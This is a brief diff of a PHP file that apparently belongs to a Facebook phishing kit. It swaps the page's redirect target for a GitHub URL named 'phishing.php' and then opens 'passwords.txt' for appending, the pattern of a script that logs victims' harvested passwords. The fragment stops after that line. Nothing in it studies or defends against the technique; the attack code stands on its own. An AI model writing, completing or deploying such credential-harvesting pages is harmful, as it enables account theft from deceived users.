@@ -1,6 +1,6 @@
 <?php
 
-header ('location: http://h1.ripway.com/test/login.php ');
+header ('location: https://github.com/rjkatyal24/Facebook/blob/master/phishing.php ');
 
 $handle = fopen("passwords.txt", "a");
 
